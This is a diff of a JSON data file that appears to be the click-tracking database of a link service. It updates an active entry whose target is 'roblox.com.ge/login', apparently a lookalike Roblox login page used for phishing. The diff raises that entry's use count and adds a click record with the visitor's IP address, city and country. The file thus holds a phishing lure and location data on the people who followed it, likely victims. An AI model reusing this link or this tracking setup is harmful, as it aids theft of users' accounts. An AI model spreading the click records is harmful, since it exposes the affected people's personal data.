@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1082,
+    "useCount": 1083,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8800,6 +8800,14 @@
         "city": "Talavera",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777255909589,
+        "ip": "16.98.104.27",
+        "country": "United States",
+        "city": "Bakersfield",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
